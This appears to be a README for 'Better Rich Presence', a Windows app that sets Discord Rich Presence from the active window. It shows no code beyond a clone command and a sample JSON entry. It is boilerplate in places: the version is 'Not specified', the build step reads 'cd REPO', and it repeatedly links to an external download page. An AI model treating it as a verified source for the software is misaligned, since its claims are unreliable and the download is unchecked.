# Better Rich Presence - Discord Rich Presence Utility 2026

> **Better Rich Presence is a lightweight Windows desktop application that watches the active window and updates your Discord Rich Presence in real time.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tim-baecker55/better-rich-presence-discord?style=flat-square)](https://github.com/tim-baecker55/better-rich-presence-discord)

---

<p align="center">
  <a href="https://tim-baecker55.github.io/better-rich-presence-discord/">
    <img src="https://img.shields.io/badge/Download-Better%20Rich%20Presence%20Latest-brightgreen?style=for-the-badge" alt="Download Better Rich Presence">
  </a>
</p>

> **[Download Better Rich Presence](https://tim-baecker55.github.io/better-rich-presence-discord/)**

---

[Download Latest Build](https://tim-baecker55.github.io/better-rich-presence-discord/)

---

## Overview

Better Rich Presence displays the application you are currently using through Discord Rich Presence. The Windows utility tracks the foreground desktop window and changes the activity status as you move between applications, so activity information does not need to be maintained by hand.

The project uses Rust, React, Tauri, and Win32 integration to provide a native desktop application with a simple user interface. Over 20 applications are covered by the built-in rules, and custom application entries can be added when the predefined detections are not enough.

---

## Key Features

- Automatically identifies the active window.
- Sends Discord Rich Presence updates as application activity changes.
- Provides predefined detection rules for more than 20 applications.
- Applies application priorities when multiple rules could match.
- Uses anti-flicker transitions to prevent unnecessary rapid status changes.
- Detects idle periods and adapts activity handling.
- Keeps CPU and memory usage low.
- Supports user-defined application entries.

---

## Getting Started

### Download the Windows application

1. Visit the [latest build download page](https://tim-baecker55.github.io/better-rich-presence-discord/).
2. Get the Windows release package.
3. Unpack it when the download is provided as an archive.
4. Start Better Rich Presence.

### Compile from source

```bash
git clone https://github.com/tim-baecker55/better-rich-presence-discord.git
cd REPO
```

Install the dependencies used by the Rust, Tauri, and React components, then run the desktop application with the development command provided by the repository.

---

## Using Better Rich Presence

1. Run Better Rich Presence on a Windows desktop.
2. Leave Discord open in the background.
3. Launch a supported application.
4. Allow the utility to detect its active window.
5. Open Discord and view the resulting Rich Presence activity.
6. Move to another application and wait for the activity to update.
7. Configure a custom application if the software you use is not part of the built-in list.

---

## Application Configuration

Detection rules and application preferences are available through the app's configuration interface or the configuration files installed with the application.

A custom application definition can look similar to this:

```json
{
  "name": "Example Application",
  "windowTitle": "Example",
  "enabled": true
}
```

Available fields may vary between builds. If changes made directly to configuration files do not appear right away, restart the application so the updated settings can be loaded.

---

## System Requirements

- A Windows desktop environment
- Discord installed and running to receive Rich Presence updates
- Rust plus the Tauri/React toolchain for source builds
- Win32-compatible active-window detection
- Available storage for the application and its configuration files

---

## Frequently Asked Questions

### Will the utility change my Discord activity automatically?

Yes. Better Rich Presence monitors the foreground window and changes the Discord Rich Presence activity when the detected application changes.

### What is the number of supported applications?

The built-in detection rules cover more than 20 applications. You can also add applications manually through custom configuration.

### Is it possible to configure an unsupported application?

Yes. Create a custom application entry and provide the application and window information that should be used for detection.

### Why does my Rich Presence keep switching?

Review the relevant detection rule and its window-title matching. The utility includes anti-flicker behavior, although broad or overlapping rules may still need to be refined.

### How does idle detection work?

When there is no active interaction for a period of time, idle detection can recognize that state and adjust activity behavior.

### Where are new builds published?

Check the [latest build page](https://tim-baecker55.github.io/better-rich-presence-discord/) for newer downloads, and review the repository for project updates.

### How should I submit a bug report?

Create an issue in the [GitHub repository](https://github.com/tim-baecker55/better-rich-presence-discord). Include your Windows version, the application involved, any configuration changes, and clear reproduction steps.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
